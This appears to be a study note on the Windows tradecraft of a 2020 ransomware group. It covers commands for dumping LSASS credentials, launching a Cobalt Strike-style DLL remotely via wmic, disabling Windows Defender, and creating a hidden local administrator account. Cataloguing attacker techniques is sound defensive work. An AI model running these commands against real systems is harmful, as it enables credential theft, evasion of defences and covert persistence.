

Ransomware attack in 2020 believed to be from a Russia-based group. In May 2022, the US  
Government offered $10,000,000 for information on the group.


>[!command]
`whoami /groups` 

Displays the groups the user belongs to


>[!command]
`
net localgroup administrators` 

See which accounts are in the administrator group  

>[!command]
`
nltest /dclist:[domain name]`

See all domain controllers (DC) on domain. DCs are the  heart of a domain and handle authentication (very important)  

>[!command]
`
rundll32.exe C:\windows\System32\comsvcs.dll MiniDump  PID C:\ProgramData\lsass.dmp full` 

Dump LSASS, which holds credentials on the Windows  machine  

>[!command]
`
wmic /node: {1} process call create "rundll32.exe  C:\ProgramData\2.dll StartW“ `  

For its part, the command and control (C2) tool Cobalt Strike  
often delivers beacon payloads in the form of DLLs. It is  
common to observe Cobalt Strike leveraging Rundll32 to call  
the StartW export function and load DLLs from the command  
line.  

>[!command]
`
wmic /node:"DC01" /user:"DOMAIN\admin"  /password:"cleartextpass" process call create "cmd / c vssadmin list shadows >> c: \log.txt“`  

List all shadow copies of a drive

>[!command]
`powershell Set-MpPreference -DisableRealtimeMonitoring  $true`

Disables Windows Defender  

>[!info]
>
>The `Set-MpPreference` cmdlet is used to configure various settings for Windows Defender (also known as Microsoft Antimalware). These settings can be used to customize the behavior of Windows Defender, such as configuring scan schedules, setting alert levels, and controlling how the malware scanner interacts with other applications.
>
When you run `Set-MpPreference`, you're essentially modifying the preferences that control how Windows Defender operates. This can include things like:
>
>- Configuring the frequency and timing of scans
>- Setting the level of alerts or notifications for detected threats
>- Controlling whether Windows Defender should interact with other security software
>- Specifying the types of files or locations to be scanned
>
>By using `Set-MpPreference`, you can fine-tune the behavior of Windows Defender to better suit your specific needs and preferences.


>[!command]
`net user oldadministrator "qc69t4B#Z0kE3" /add `

Adds a new user  

>[!command]
`net localgroup Administrators oldadministrator /ADD` 

Adds the new user to the local administrators group  

reg add  "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows  NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v  oldadministrator /t REG_DWORD /d 0 / f  
Hides the new user’s account in the login screen